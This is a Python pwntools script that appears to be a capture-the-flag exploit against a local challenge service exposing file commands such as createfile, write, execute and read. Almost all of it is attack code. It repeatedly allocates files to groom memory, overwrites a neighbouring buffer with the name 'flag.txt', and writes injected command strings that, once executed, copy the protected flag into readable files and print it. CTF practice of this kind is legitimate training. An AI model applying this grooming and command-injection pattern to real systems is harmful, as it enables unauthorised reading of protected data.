from pwn import *
import string


def encode_string(buf: str) -> str:
    buf = buf.replace('\\', '\\\\')
    buf = buf.replace('"', '\\"')
    return '"' + buf + '"'


if __name__ == "__main__":
    p = process(['./run.sh'])

    p.recvuntil('> ')

    for i in range(9):
        p.sendline('createfile("aaaaaaaa", 256, 1)')
        p.sendline('createfile("bbbbbbbb", 80, 1)')
        p.sendline('createfile("cccccccc", 80, 1)')
        p.sendline('createfile("dddddddd", 80, 1)')

    p.sendline('createfile("bbbbbbbb", 80, 1)')
    p.sendline('write("aaaaaaaa", {}, 256)'.format(encode_string("flag.txt")))

    p.sendline('createfile("ex", 100, 3)')
    p.sendline('write("ex", {}, 0)'.format(
        encode_string(
            'createfile("flagflag", 32, 3)\\nwrite("flagflag",read("flag.txt",0,32),0)'
        )))

    p.sendline('execute("ex")')

    p.sendline('remove("flag.txt")')

    for i in range(10):
        p.sendline('createfile("flag.txt", 80, 1)')
    p.sendline('remove("bbbbbbbb")')

    p.sendline('createfile("ex2", 200, 3)')
    p.sendline('write("ex2", {}, 0)'.format(
        encode_string(
            f'createfile("leaked", 32, 3)\\nwrite("leaked",read("flagflag", 0, 32),0)')
    ))
    p.sendline('execute("ex2")')

    p.sendline('print(read("flag.txt", 0, 32))')

    p.interactive()
